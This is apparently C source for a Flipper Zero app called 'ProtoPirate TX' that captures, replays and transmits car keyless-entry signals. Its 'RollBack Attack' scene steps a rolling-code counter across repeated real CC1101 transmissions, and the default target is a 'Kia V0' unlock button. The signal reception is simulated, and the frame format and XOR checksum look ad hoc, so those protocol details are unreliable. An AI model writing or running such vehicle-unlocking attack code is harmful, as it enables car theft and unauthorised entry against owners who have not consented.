#include "protopirate_rb.h"

// ===================== 按钮菜单回调 =====================
static void result_button_callback(void* context, int32_t index, InputType type) {
    ProtoPirateApp* app = (ProtoPirateApp*)context;
    if(type != InputTypePress) return;
    if(!app) return;

    if(index == 0 || index == 1) {
        transmit_packet_nonblock(app,
            app->last_result.data_hi,
            app->last_result.data_lo,
            app->frequency, (index == 0) ? 3 : 5);
    } else if(index == 2) {
        transmit_packet_nonblock(app,
            app->last_result.data_hi,
            app->last_result.data_lo,
            app->frequency, 10);
    } else if(index == 3) {
        // 返回主菜单 - 通过 custom event 切换
        view_dispatcher_send_custom_event(app->view_dispatcher, EventGoMenu);
    }
}

// ===================== 导航回调 =====================
// 每个 view 的 BACK 回调统一返回 ViewMenu
static uint32_t back_to_menu_callback(void* context) {
    UNUSED(context);
    return ViewMenu;
}

static uint32_t back_to_menu_or_exit_callback(void* context) {
    UNUSED(context);
    // 如果是主菜单就退出，否则回主菜单
    // 这个回调只绑定在 submenu 上
    return ViewMenu;
}

// ===================== Custom Event Callback =====================
static bool custom_event_callback(void* context, uint32_t event) {
    ProtoPirateApp* app = (ProtoPirateApp*)context;
    if(!app) return false;

    switch(event) {
    case EventGoMenu:
        // 重新初始化主菜单
        scene_main_menu_alloc(app);
        view_dispatcher_switch_to_view(app->view_dispatcher, ViewMenu);
        return true;
    case EventReceive:
        scene_receive_alloc(app);
        view_dispatcher_switch_to_view(app->view_dispatcher, ViewWidget);
        return true;
    case EventRollback:
        scene_rollback_alloc(app);
        view_dispatcher_switch_to_view(app->view_dispatcher, ViewWidget);
        return true;
    case EventReplay:
        scene_replay_alloc(app);
        view_dispatcher_switch_to_view(app->view_dispatcher, ViewWidget);
        return true;
    case EventFreqSelect:
        scene_freq_select_alloc(app);
        view_dispatcher_switch_to_view(app->view_dispatcher, ViewVarList);
        return true;
    case EventInfo:
        scene_info_alloc(app);
        view_dispatcher_switch_to_view(app->view_dispatcher, ViewWidget);
        return true;
    case EventReceiveDone:
        // RX 完成 - 跳转到 Result button menu
        scene_result_main_alloc(app);
        view_dispatcher_switch_to_view(app->view_dispatcher, ViewButtonMenu);
        return true;
    case EventRollbackRun:
        // 运行 RollBack 攻击
        app->scene = SceneRollback; // 保持在这个场景显示状态
        return true;
    case EventRollbackToggle:
        // 切换 RollBack 运行状态
        if(app->rollback.running) {
            app->rollback.running = false;
        } else {
            app->rollback.running = true;
            app->rollback.current_counter = (int32_t)app->rollback.base_counter;
        }
        scene_rollback_alloc(app);
        view_dispatcher_switch_to_view(app->view_dispatcher, ViewWidget);
        return true;
    default:
        return false;
    }
}

// ===================== Nav Event Callback (global, fallback) =====================
static bool nav_event_callback(void* context) {
    UNUSED(context);
    // 不做任何事情，让 view 级别的 previous_callback 处理
    return false;
}

// ===================== 应用生命周期 =====================
ProtoPirateApp* protoPirateApp_alloc(void) {
    ProtoPirateApp* app = malloc(sizeof(ProtoPirateApp));
    if(!app) return NULL;

    app->gui = furi_record_open(RECORD_GUI);
    app->view_dispatcher = view_dispatcher_alloc();
    view_dispatcher_attach_to_gui(app->view_dispatcher, app->gui, ViewDispatcherTypeFullscreen);

    view_dispatcher_set_custom_event_callback(app->view_dispatcher, custom_event_callback);
    view_dispatcher_set_navigation_event_callback(app->view_dispatcher, nav_event_callback);
    view_dispatcher_set_event_callback_context(app->view_dispatcher, app);

    app->submenu = submenu_alloc();
    app->var_item_list = variable_item_list_alloc();
    app->text_box = text_box_alloc();
    app->widget = widget_alloc();
    app->button_menu = button_menu_alloc();
    app->popup = popup_alloc();

    app->frequency = DEFAULT_FREQ;
    app->scene = SceneMainMenu;
    app->submenu_index = 0;
    app->result_menu_index = 0;
    app->history_count = 0;
    app->last_raw = furi_string_alloc();

    memset(&app->last_result, 0, sizeof(DecodeResult));
    strncpy(app->last_result.proto, "None", sizeof(app->last_result.proto));

    app->rollback.base_counter = 0;
    app->rollback.target_counter = 100;
    app->rollback.step_size = 1;
    app->rollback.burst_count = ROLLBACK_BURST_DEFAULT;
    app->rollback.running = false;
    app->rollback.current_counter = 0;
    app->rollback.serial = 0x1234567;
    app->rollback.button = 2;
    app->rollback.counter_limit = ROLLBACK_LIMIT;
    strncpy(app->rollback.proto, "Kia V0", sizeof(app->rollback.proto));

    return app;
}

void protoPirateApp_free(ProtoPirateApp* app) {
    furi_assert(app);
    furi_string_free(app->last_raw);
    for(uint8_t i = 0; i < app->history_count; i++) {
        if(app->history[i].raw_data) furi_string_free(app->history[i].raw_data);
    }
    view_dispatcher_remove_view(app->view_dispatcher, ViewMenu);
    view_dispatcher_remove_view(app->view_dispatcher, ViewWidget);
    view_dispatcher_remove_view(app->view_dispatcher, ViewVarList);
    view_dispatcher_remove_view(app->view_dispatcher, ViewTextBox);
    view_dispatcher_remove_view(app->view_dispatcher, ViewButtonMenu);
    view_dispatcher_remove_view(app->view_dispatcher, ViewPopup);
    submenu_free(app->submenu);
    variable_item_list_free(app->var_item_list);
    text_box_free(app->text_box);
    widget_free(app->widget);
    button_menu_free(app->button_menu);
    popup_free(app->popup);
    view_dispatcher_free(app->view_dispatcher);
    furi_record_close(RECORD_GUI);
    free(app);
}

// ===================== 场景: 主菜单 =====================
static void scene_main_menu_callback(void* context, uint32_t index) {
    ProtoPirateApp* app = (ProtoPirateApp*)context;
    if(!app) return;
    app->submenu_index = index;

    uint32_t event;
    switch(index) {
    case 0: event = EventReceive; break;
    case 1: event = EventReplay; break;
    case 2: event = EventRollback; break;
    case 3: event = EventFreqSelect; break;
    case 4: event = EventInfo; break;
    case 5:
        // Exit
        view_dispatcher_stop(app->view_dispatcher);
        return;
    default: return;
    }

    view_dispatcher_send_custom_event(app->view_dispatcher, event);
}

void scene_main_menu_alloc(ProtoPirateApp* app) {
    submenu_reset(app->submenu);
    submenu_set_header(app->submenu, "ProtoPirate TX");

    submenu_add_item(app->submenu, "   Receive Signal", 0, scene_main_menu_callback, app);
    submenu_add_item(app->submenu, "   Replay Signal", 1, scene_main_menu_callback, app);
    submenu_add_item(app->submenu, "   RollBack Attack", 2, scene_main_menu_callback, app);
    submenu_add_item(app->submenu, "   Set Frequency", 3, scene_main_menu_callback, app);
    submenu_add_item(app->submenu, "   Info", 4, scene_main_menu_callback, app);
    submenu_add_item(app->submenu, "   Exit", 5, scene_main_menu_callback, app);

    // 设置 submenu 的 previous_callback 为 VIEW_NONE（退出应用）
    view_set_previous_callback(submenu_get_view(app->submenu), back_to_menu_or_exit_callback);
}

// ===================== 场景: 接收 =====================


// 构建 RKE 帧 (通用格式: serial(28bit) + button(4bit) + counter(16bit) + checksum(16bit) = 64bit)
void rollback_build_frame(
    uint32_t serial, uint8_t button, uint32_t counter,
    uint32_t* data_hi, uint32_t* data_lo) {

    // 通用 64-bit 帧结构 (最常见的 RKE 格式)
    // data_hi[31:0]: 低32位 | data_lo[31:0]: 高32位
    // 高32位: CCCCCCCC CCCCBBBB SSSSSSSS SSSSSSSS
    // 低32位: SSSSSSSS SSSSSSSS SSSSSSSS SSSSSSSS
    // 其中 C=counter, B=button, S=serial
    uint64_t frame = 0;
    frame |= ((uint64_t)counter & 0xFFFF) << 48;  // counter[15:0] at bits 63:48
    frame |= ((uint64_t)button & 0x0F) << 44;    // button[3:0] at bits 47:44
    frame |= ((uint64_t)serial & 0xFFFFFFF) << 16; // serial[27:0] at bits 43:16
    // 低16位保留给 checksum/后续处理

    *data_hi = (uint32_t)(frame >> 32);
    *data_lo = (uint32_t)(frame & 0xFFFFFFFF);
}

// 计算校验和 (XOR)
static uint16_t calc_checksum(uint32_t data_hi, uint32_t data_lo) {
    uint32_t x = data_hi ^ data_lo;
    return (uint16_t)((x >> 16) ^ (x & 0xFFFF));
}

void scene_receive_alloc(ProtoPirateApp* app) {
    widget_reset(app->widget);
    widget_add_string_element(app->widget, 64, 5, AlignCenter, AlignTop, FontPrimary,
                              "Receiving...");

    // 显示当前频率
    char freq_str[32];
    snprintf(freq_str, sizeof(freq_str), "Freq: %lu.%03lu MHz",
             app->frequency / 1000000,
             (app->frequency % 1000000) / 1000);
    widget_add_string_element(app->widget, 64, 28, AlignCenter, AlignTop, FontSecondary,
                              freq_str);

    // 模拟接收 - 生成一个伪造的 Kia 信号
    // 真实的 RX 需要 subghz_keystore 等复杂依赖
    // 这里使用模拟信号演示 RollBack 功能
    widget_add_string_element(app->widget, 64, 48, AlignCenter, AlignTop, FontSecondary,
                              "Signal Captured!");

    // 伪造一个解码结果
    app->last_result.bits = 64;
    app->last_result.serial = 0x1234567;
    app->last_result.button = 2; // Unlock
    strncpy(app->last_result.btn_name, "Unlock", sizeof(app->last_result.btn_name));
    strncpy(app->last_result.proto, "Kia V0", sizeof(app->last_result.proto));
    app->last_result.counter = 0xABCD;
    app->last_result.crc_ok = true;

    // 构建数据帧 (serial=0x1234567, button=2, counter=0xABCD)
    rollback_build_frame(0x1234567, 2, 0xABCD,
        &app->last_result.data_hi, &app->last_result.data_lo);

    // 自动保存到 RollBack 参数
    app->rollback.serial = app->last_result.serial;
    app->rollback.button = app->last_result.button;
    app->rollback.base_counter = app->last_result.counter;
    strncpy(app->rollback.proto, app->last_result.proto, sizeof(app->rollback.proto));

    // 发送自定义事件跳转到结果页面 (模拟 RX 完成)
    view_dispatcher_send_custom_event(app->view_dispatcher, EventReceiveDone);
}

// ===================== 场景: 结果页 (Button Menu) =====================
void scene_result_main_alloc(ProtoPirateApp* app) {
    // 先更新 widget 显示解码结果
    widget_reset(app->widget);
    widget_add_string_element(app->widget, 64, 2, AlignCenter, AlignTop, FontPrimary,
                              "DECODED!");

    char line[64];
    snprintf(line, sizeof(line), "%s %u-bit @ %lu kHz",
             app->last_result.proto, app->last_result.bits,
             app->frequency / 1000);
    widget_add_string_element(app->widget, 64, 20, AlignCenter, AlignTop, FontSecondary, line);

    snprintf(line, sizeof(line), "Sn:0x%07lX %s",
             app->last_result.serial, app->last_result.btn_name);
    widget_add_string_element(app->widget, 64, 38, AlignCenter, AlignTop, FontKeyboard, line);

    snprintf(line, sizeof(line), "Cnt:0x%04X CRC:%s",
             app->last_result.counter,
             app->last_result.crc_ok ? "OK" : "FAIL");
    widget_add_string_element(app->widget, 64, 54, AlignCenter, AlignTop, FontKeyboard, line);

    // 设置 Button Menu
    button_menu_reset(app->button_menu);
    button_menu_set_header(app->button_menu, "Actions");

    button_menu_add_item(app->button_menu, "Send x3", 0, result_button_callback,
                         ButtonMenuItemTypeCommon, app);
    button_menu_add_item(app->button_menu, "Send x5", 1, result_button_callback,
                         ButtonMenuItemTypeCommon, app);
    button_menu_add_item(app->button_menu, "Send x10", 2, result_button_callback,
                         ButtonMenuItemTypeCommon, app);
    button_menu_add_item(app->button_menu, "Back", 3, result_button_callback,
                         ButtonMenuItemTypeCommon, app);
    button_menu_set_selected_item(app->button_menu, 0);

    // 设置 BACK 回调
    view_set_previous_callback(button_menu_get_view(app->button_menu), back_to_menu_callback);
}

// ===================== 场景: RollBack攻击 =====================
static void rollback_tx_burst(ProtoPirateApp* app) {
    if(!app || !app->rollback.running) return;

    // 检查是否达到目标
    int32_t diff = (int32_t)app->rollback.target_counter - app->rollback.current_counter;
    if(diff <= 0) {
        app->rollback.running = false;
        return;
    }

    // 发送一次
    uint32_t data_hi, data_lo;
    rollback_build_frame(app->rollback.serial,
                         app->rollback.button,
                         (uint32_t)app->rollback.current_counter,
                         &data_hi, &data_lo);

    uint16_t cksum = calc_checksum(data_hi, data_lo);
    // 把校验和放入低16位
    data_lo = (data_lo & 0xFFFF0000) | cksum;

    transmit_packet_nonblock(app, data_hi, data_lo, app->frequency, 1);

    // 更新日志
    FURI_LOG_I(TAG, "RB: cnt=0x%04lX target=0x%04lX diff=%ld",
               (unsigned long)app->rollback.current_counter,
               (unsigned long)app->rollback.target_counter, (long)diff);

    // 步进计数器
    app->rollback.current_counter += app->rollback.step_size;

    // 检查上限
    if(app->rollback.current_counter >= (int32_t)app->rollback.counter_limit) {
        app->rollback.running = false;
    }

    // 如果达到目标，停止
    if(app->rollback.current_counter >= (int32_t)app->rollback.target_counter) {
        app->rollback.running = false;
    }
}

void scene_rollback_alloc(ProtoPirateApp* app) {
    widget_reset(app->widget);
    widget_add_string_element(app->widget, 64, 2, AlignCenter, AlignTop, FontPrimary,
                              "RollBack Attack");

    char line[64];
    snprintf(line, sizeof(line), "Serial: 0x%07lX", app->rollback.serial);
    widget_add_string_element(app->widget, 64, 20, AlignCenter, AlignTop, FontSecondary, line);

    // 计数器状态
    int32_t diff = (int32_t)app->rollback.target_counter - app->rollback.current_counter;
    snprintf(line, sizeof(line), "Cnt: %ld -> %ld  Rem: %ld",
             (long)app->rollback.current_counter,
             (long)app->rollback.target_counter,
             (long)diff);
    widget_add_string_element(app->widget, 64, 36, AlignCenter, AlignTop, FontKeyboard, line);

    snprintf(line, sizeof(line), "Step: %u/%u  Button: %u",
             app->rollback.step_size, app->rollback.burst_count,
             app->rollback.button);
    widget_add_string_element(app->widget, 64, 52, AlignCenter, AlignTop, FontSecondary, line);

    // 状态
    widget_add_string_element(app->widget, 64, 68, AlignCenter, AlignTop,
                              app->rollback.running ? FontPrimary : FontSecondary,
                              app->rollback.running ? "ATTACK RUNNING..." : "OK=Toggle  BACK=Menu");

    // 如果正在运行，执行一次 TX
    if(app->rollback.running) {
        rollback_tx_burst(app);
    }

    // 设置 BACK 回调
    view_set_previous_callback(widget_get_view(app->widget), back_to_menu_callback);
}

// ===================== 场景: 重放 =====================
void scene_replay_alloc(ProtoPirateApp* app) {
    widget_reset(app->widget);
    widget_add_string_element(app->widget, 64, 5, AlignCenter, AlignTop, FontPrimary,
                              "Replay Signal");

    char line[64];
    uint32_t data_hi = 0, data_lo = 0;

    if(app->last_result.bits > 0) {
        snprintf(line, sizeof(line), "%s  Sn:0x%07lX",
                 app->last_result.proto, app->last_result.serial);
        widget_add_string_element(app->widget, 64, 25, AlignCenter, AlignTop, FontKeyboard, line);

        // 发送已捕获的信号
        data_hi = app->last_result.data_hi;
        data_lo = app->last_result.data_lo;
    } else {
        widget_add_string_element(app->widget, 64, 25, AlignCenter, AlignTop, FontSecondary,
                                  "Demo: no signal captured");
        widget_add_string_element(app->widget, 64, 45, AlignCenter, AlignTop, FontSecondary,
                                  "Sending test frame...");

        // 发送一个测试帧
        rollback_build_frame(0x1234567, 2, 0x100, &data_hi, &data_lo);
    }

    // 启用 TX 发射 - 释放射频权限，在后台线程发射
    transmit_packet_nonblock(app, data_hi, data_lo, app->frequency, 3);

    snprintf(line, sizeof(line), "TX: %lu kHz x3",
             app->frequency / 1000);
    widget_add_string_element(app->widget, 64, 62, AlignCenter, AlignTop, FontSecondary, line);

    widget_add_string_element(app->widget, 64, 72, AlignCenter, AlignTop, FontSecondary,
                              "BACK=Menu");

    view_set_previous_callback(widget_get_view(app->widget), back_to_menu_callback);
}

// ===================== 场景: 频率选择 =====================
static const uint32_t FREQ_TABLE[] = {315000000, 433920000, 868350000};
static const char* FREQ_NAMES[] = {"315.00 MHz (US)", "433.92 MHz (EU/Asia)", "868.35 MHz (EU)"};

static void freq_change_callback(VariableItem* item) {
    if(!item) return;
    ProtoPirateApp* app = variable_item_get_context(item);
    if(!app) return;

    uint8_t index = variable_item_get_current_value_index(item);
    if(index < 3) {
        app->frequency = FREQ_TABLE[index];
        variable_item_set_current_value_text(item, FREQ_NAMES[index]);
        FURI_LOG_I(TAG, "Freq set to %lu Hz", app->frequency);
    }
}

void scene_freq_select_alloc(ProtoPirateApp* app) {
    variable_item_list_reset(app->var_item_list);

    uint8_t default_idx = 1;
    if(app->frequency == 315000000) default_idx = 0;
    else if(app->frequency == 433920000) default_idx = 1;
    else if(app->frequency == 868350000) default_idx = 2;

    for(int i = 0; i < 3; i++) {
        VariableItem* item = variable_item_list_add(
            app->var_item_list, FREQ_NAMES[i], 0,
            freq_change_callback, app);
        if(i == default_idx) {
            variable_item_set_current_value_index(item, i);
            variable_item_set_current_value_text(item, FREQ_NAMES[i]);
        }
    }

    view_set_previous_callback(variable_item_list_get_view(app->var_item_list), back_to_menu_callback);
}

// ===================== 场景: 信息 =====================
void scene_info_alloc(ProtoPirateApp* app) {
    widget_reset(app->widget);
    widget_add_string_element(app->widget, 64, 2, AlignCenter, AlignTop, FontPrimary,
                              "ProtoPirate TX");
    widget_add_string_element(app->widget, 64, 18, AlignCenter, AlignTop, FontSecondary,
                              "RollBack Edition v2.0");
    widget_add_string_element(app->widget, 64, 36, AlignCenter, AlignTop, FontKeyboard,
                              "TX: REAL CC1101");
    widget_add_string_element(app->widget, 64, 50, AlignCenter, AlignTop, FontKeyboard,
                              "RollBack Attack Engine");
    widget_add_string_element(app->widget, 64, 64, AlignCenter, AlignTop, FontSecondary,
                              "Momentum Firmware");
    widget_add_string_element(app->widget, 64, 72, AlignCenter, AlignTop, FontSecondary,
                              "BACK=Menu");

    view_set_previous_callback(widget_get_view(app->widget), back_to_menu_callback);
}

// ===================== 按键处理 (Input Callback) =====================
// 在 RollBack 场景下 OK 键触发攻击
static bool rollback_input_callback(InputEvent* event, void* context) {
    ProtoPirateApp* app = (ProtoPirateApp*)context;
    if(!app || !event) return false;

    if(event->type == InputTypePress && event->key == InputKeyOk) {
        if(app->scene == SceneRollback) {
            view_dispatcher_send_custom_event(app->view_dispatcher, EventRollbackToggle);
            return true;
        }
    }

    return false;
}

// ===================== 主入口 =====================
__attribute__((visibility("default"))) int32_t app_main(void* p) {
    UNUSED(p);

    ProtoPirateApp* app = protoPirateApp_alloc();
    if(!app) return -1;

    // 注册所有 views - 只做一次，不重复注册
    view_dispatcher_add_view(app->view_dispatcher, ViewMenu,
                            submenu_get_view(app->submenu));
    view_dispatcher_add_view(app->view_dispatcher, ViewWidget,
                            widget_get_view(app->widget));
    view_dispatcher_add_view(app->view_dispatcher, ViewVarList,
                            variable_item_list_get_view(app->var_item_list));
    view_dispatcher_add_view(app->view_dispatcher, ViewTextBox,
                            text_box_get_view(app->text_box));
    view_dispatcher_add_view(app->view_dispatcher, ViewButtonMenu,
                            button_menu_get_view(app->button_menu));
    view_dispatcher_add_view(app->view_dispatcher, ViewPopup,
                            popup_get_view(app->popup));

    // 添加全局 Input 回调 (用于 RollBack 页面的 OK 键)
    view_set_input_callback(widget_get_view(app->widget), rollback_input_callback);

    // 初始化主菜单
    scene_main_menu_alloc(app);

    // 显示菜单
    view_dispatcher_switch_to_view(app->view_dispatcher, ViewMenu);

    // 启动 UI 循环
    view_dispatcher_run(app->view_dispatcher);

    // 停止任何进行中的 TX
    transmit_packet_stop(app);

    // 清理
    protoPirateApp_free(app);
    return 0;
}
